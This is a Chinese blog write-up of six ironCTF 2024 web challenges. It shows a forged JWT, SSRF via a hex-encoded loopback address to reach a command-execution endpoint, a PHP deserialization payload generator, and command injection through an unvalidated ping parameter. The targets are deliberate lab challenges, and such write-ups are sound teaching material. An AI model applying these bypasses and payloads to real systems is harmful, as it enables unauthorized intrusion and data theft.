---
title: "ironCTF 2024 WEB EICS1 部分wp"
date: 2024-10-07 11:58
updated: 2024-10-07 11:58
categories: "CTF"
tags:
  - "CTF"
  - "Web Security"
  - "Writeup"
  - "PHP"
  - "Python"
description: "好耶！是第一次拿奖的CTF！（虽然说这次re手不在有点可惜） 用户名 得分 LamentTyphon 2468 Jerrythepro123 2610 Dragonkeep 483 WEB JWT Hunt Mango Loan App b64SiteViewer cerealShop MovieR"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18449823"
---
![](/images/migrated/18449823/01.png)

好耶！是第一次拿奖的CTF！（虽然说这次re手不在有点可惜）

| 用户名 | 得分 |
| --- | --- |
| LamentTyphon | 2468 |
| Jerrythepro123 | 2610 |
| Dragonkeep | 483 |

**[WEB](https://www.cnblogs.com/LAMENTXU#1)**

-   [JWT Hunt](https://www.cnblogs.com/LAMENTXU#1.1)
-   [Mango](https://www.cnblogs.com/LAMENTXU#1.2)
-   [Loan App](https://www.cnblogs.com/LAMENTXU#1.3)
-   [b64SiteViewer](https://www.cnblogs.com/LAMENTXU#1.4)
-   [cerealShop](https://www.cnblogs.com/LAMENTXU#1.5)
-   [MovieReviewApp](https://www.cnblogs.com/LAMENTXU#1.6)

# WEB

**beginner的web题有点过于唐了。唐题≠难题。**

## JWT Hunt

唐题。jwt的secret被四等分在各个角落，还不让用扫描器

-   part1: /robots.txt
-   part2: cookie里
-   part3: /sitemap.xml
-   part4: curl /secretkeypart4

part1,2,4都算常规。part3你告诉我不用扫描器怎么做。。。有点逆天了嗷

最后是队里pwn✌用“lightfuzz”出的（））

![](/images/migrated/18449823/02.png)

最后凑出来的key：6yH$#v9Wq3e&Zf8LpRt1%Y4nJ^aPk7Sd2C@mQjUwEbGoIhNy0T!BxlVz5uMKA#Yp

cookie填: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI4MjAwMjYyfQ.IYR8d9sNi0C0e8OYm8-BSh86geTSMzTfonN4o9PKksI

**ironCTF{W0w\_U\_R34lly\_Kn0w\_4\_L07\_Ab0ut\_JWT\_3xp10r4710n!}**

## Mango

这位更是重量级。看题目以为是MongoDB数据库注入啥的，试了半天没结果。md最后发现直接访问https://mango.1nf1n1ty.team/admin/index就有flag。。。（无语）

**ironCTF{I\_Said\_M@nG0\_N0t\_M0ngo!}**

好了唐题就到这里。以后这种题少出点真的（

## Loan App

先看配置文件（吸取教训了）

```
global
    log stdout format raw local0
    maxconn 2000
    user root
    group root
    daemon

defaults
    log global
    option httplog
    timeout client 30s
    timeout server 30s
    timeout connect 30s

frontend http_front
    mode http
    bind :80
    acl is_admin path_beg /admin
    http-request deny if is_admin
    default_backend gunicorn

backend gunicorn
    mode http
    balance roundrobin
    server loanserver loanapp:8000 maxconn 32
```

看到有一个配置文件上的限制（不能去/admin）然而，一般这种都是可以找到现成的漏洞直接绕的（不然这题就没法解了）

bing了一下，出**CVE-2021-40346**

同样的payload打就完了。这里贴一个别的博客的解

![](/images/migrated/18449823/03.png)

然而，这是预期解。在我做题的时候直接把uuid检测那个函数放bing上搜，搜到了这样的一篇文章：[https://stackoverflow.com/questions/25051675/how-to-validate-uuid-v4-in-go](https://stackoverflow.com/questions/25051675/how-to-validate-uuid-v4-in-go)

直接输入fbd3036f-0f1c-4e98-b71c-d4cd61213f90直接就tm出flag了？？？？？？

![](/images/migrated/18449823/04.png)

不是哥们。等我搞明白发生肾么事了在把这段补上（

## b64SiteViewer

附件

```
from flask import render_template,render_template_string,Flask,request
from urllib.parse import urlparse
import urllib.request
import random
import os
import subprocess
import base64
app=Flask(__name__)
app.secret_key=os.urandom(16)

@app.route('/',methods=['GET','POST'])
def home():
    if request.method=='GET':
        return render_template('home.html')
    if request.method=='POST':
        try:
            url=request.form.get('url')
            scheme=urlparse(url).scheme
            hostname=urlparse(url).hostname
            blacklist_scheme=['file','gopher','php','ftp','dict','data']
            blacklist_hostname=['127.0.0.1','localhost','0.0.0.0','::1','::ffff:127.0.0.1']
            if scheme in blacklist_scheme:
                return render_template_string('blocked scheme')     
            if hostname in blacklist_hostname:
                return render_template_string('blocked host')
            t=urllib.request.urlopen(url)
            content = t.read()
            output=base64.b64encode(content)
            return (f'''base64 version of the site:
                {output[:1000]}''')
        except Exception as e:
                print(e)
                return f" An error occurred: {e} - Unable to visit this site, try some other website."

@app.route('/admin')
def admin():
    remote_addr = request.remote_addr
    
    if remote_addr in ['127.0.0.1', 'localhost']:
        cmd=request.args.get('cmd','id')
        cmd_blacklist=['REDACTED']
        if "'" in cmd or '"' in cmd:
            return render_template_string('Command blocked')
        for i in cmd_blacklist:
            if i in cmd:
                return render_template_string('Command blocked')
        print(f"Executing: {cmd}")
        res= subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return res.stdout
    else:
        return render_template_string("Don't hack me")

if __name__=="__main__":
    app.run(host='0.0.0.0',port='5000')
```

一眼ssrf+RCE。我们要绕两个黑名单过滤。RCE这个好说（我们CN CTFER对RCE无所畏惧了已经，新生赛全是这些）主要是SSRF的过滤卡了我一会。

这里可以用进制绕过

**127.0.0.1 == 0x7F.0.0.1**

这题出题人还是有点仁慈了，需要ssti的服务/admin居然是get传参。还是相当方便的。

访问url：[http://0x7F.0.0.1:5000/admin?cmd=env](http://127.0.0.1:5000/admin?cmd=env)

返回：base64 version of the site: b'Q29tbWFuZCBibG9ja2Vk'，解码得Command blocked

显然我们还有一个黑盒的黑名单要绕，但这个纯唐。随便手fuzz一下就出了

访问url：[http://0x7F.0.0.1:5000/admin?cmd=en\\v](http://127.0.0.1:5000/admin?cmd=en%5Cv)

出：base64 version of the site: b'U0hMVkw9MQpPTERQV0Q9LwpMQ19DVFlQRT1DLlVURi04CldFUktaRVVHX1NFUlZFUl9GRD0zCmZsYWc9aXJvbkNURnt5MHU0cjNyMGNrMW42azMzcGg0Y2sxbjZ9Cl89L3Vzci9sb2NhbC9iaW4vcHl0aG9uClBXRD0vaG9tZS91c2VyCg=='

解码得flag

**ironCTF{y0u4r3r0ck1n6k33ph4ck1n6}**

## cerealShop

黑盒题。进去F12看源码：

![](/images/migrated/18449823/05.png)

看到file想到路径穿越漏洞。先正常读取一个试试水

[https://cerealshop.1nf1n1ty.team/?file=styles.css](https://cerealshop.1nf1n1ty.team/?file=styles.css)

![](/images/migrated/18449823/06.png)

没问题

根据base64中的提示访问../../../../../source出源码

![](/images/migrated/18449823/07.png)

整理源码：

```
<?php

// 获取通过GET请求传递的文件名
$file = $_GET['file']; 

// 包含（执行）指定的文件
includeFile($file); 

// 获取环境变量中的FLAG值
$FLAG = getenv('FLAG'); 

class Admin {
    // 类的属性
    public $is_admin = "";
    public $your_secret = "";
    public $my_secret = "";

    // 类的构造函数
    public function __construct($in, $ysecret, $msecret) {
        // 使用md5加密传入的$in值，并赋值给is_admin属性
        $this->is_admin = md5($in); 
        // 直接赋值给其他两个属性
        $this->your_secret = $ysecret; 
        $this->my_secret = $msecret; 
    }

    // 魔术方法__toString，当对象被用在需要字符串的上下文中时会被调用
    public function __toString() {
        // 返回is_admin属性的值
        return $this->is_admin; 
    }
}

// 检查是否存在名为'can_you_get_me'的cookie
if (isset($_COOKIE['can_you_get_me'])) {
    try {
        // 对cookie中的值进行base64解码
        $f = base64_decode($_COOKIE['can_you_get_me']);
        // 如果解码失败，抛出异常
        if (!$f) {
            throw new Exception(""); 
        }
        // 反序列化解码后的字符串
        $unout = unserialize($f); 
        // 如果反序列化失败，抛出异常
        if (!$unout) {
            throw new Exception("\n wrong cookie"); 
        }
        // 设置对象的my_secret属性为FLAG的值
        $unout->my_secret = $FLAG; 
        // 检查is_admin属性是否为0（md5加密后的0），以及your_secret是否等于my_secret
        if ($unout->is_admin == 0 && $unout->your_secret === $unout->my_secret) {
            // 如果条件满足，输出FLAG
            echo "Okay here is your flag:", $FLAG; 
        } else {
            // 否则输出"no"
            echo "no "; 
        }
    } catch (Exception $e) {
        // 捕获并输出异常信息
        echo "Error: " . $e->getMessage()
```

一个经典的反序列化漏洞。可以看：[https://www.cnblogs.com/LAMENTXU/articles/18147817#1.10](https://www.cnblogs.com/LAMENTXU/articles/18147817#1.10) 第一关几乎一样

搓链子出：

```
<?php
class Admin {
    public $is_admin = 0;
    public $your_secret = "";
    public $my_secret = "";
    public function __construct() {
		$this->my_secret = 'a';
        $this->your_secret = &$this->my_secret;  
    }
    public function __toString() {
        return $this->is_admin; 
    }
}
echo base64_encode(serialize(new Admin()));
?>
```

把输出填进cookie里（can\_you\_get\_me）得flag

![](/images/migrated/18449823/08.png)

**ironCTF{D353r1411Z4710N\_4T\_1T5\_B35T}**

## MovieReviewApp

.git泄露源码

```
from flask import Flask, render_template, request, redirect, url_for, flash, session
import psutil
import os
import platform
import subprocess
import re
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.urandom(32)
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
ADMIN_PASSWORD =  os.getenv('ADMIN_PASSWORD')

@app.route('/')
def home():
    return render_template('index.html')
    
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin_panel'))
        else:
            flash("Invalid credentials. Please try again.")
    
    return render_template('login.html')

def ping_ip(ip, count):
    if re.match(r'^((25[05]|(2[04]|1\d|[19]|)\d)\.?\b){4}$', ip):
        return subprocess.check_output(f"ping c {count} {ip}", shell=True).decode()
    else:
        return "Invalid ip address and count!"
    

@app.route('/admin_panel', methods=['GET', 'POST'])
def admin_panel():
    if 'logged_in' not in session:
        return redirect(url_for('admin'))
    ping_result = None
    if request.method == 'POST':
        ip = request.form.get('ip')
        count = request.form.get('count', 1)
        try:
            ping_result = ping_ip(ip, count)
        except ValueError:
            flash("Count must be a valid integer")
        except Exception as e:
            flash(f"An error occurred: {e}")

    memory_info = psutil.virtual_memory()
    memory_usage = memory_info.percent
    total_memory = memory_info.total / (1024 ** 2) 
    available_memory = memory_info.available / (1024 ** 2) 
    return render_template('admin.html', ping_result=ping_result, 
                           memory_usage=memory_usage, total_memory=total_memory, 
                           available_memory=available_memory)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('admin'))

if __name__ == '__main__':
    app.run(debug=True)
```

查询git提交历史：

![](/images/migrated/18449823/09.png)

获得用户名密码

![](/images/migrated/18449823/10.png)

获得url路径

前往https://movie-review.1nf1n1ty.team/servermonitor/admin登录即可

![](/images/migrated/18449823/11.png)

让我想起了buuctf上的ping ping ping。看关键的函数：

```
def ping_ip(ip, count):
    if re.match(r'^((25[05]|(2[04]|1\d|[19]|)\d)\.?\b){4}$', ip):
        return subprocess.check_output(f"ping c {count} {ip}", shell=True).decode()
    else:
        return "Invalid ip address and count!"
```

只对ip进行了严格的过滤。而count**理论上**只能是数字（但只是前端限制）所以没有过滤。

burp抓包改一下出

![](/images/migrated/18449823/12.png)

cat /flag.txt

![](/images/migrated/18449823/13.png)

**ironCTF{4lways\_b3\_c4ar3ful\_w1th\_G1t!}**
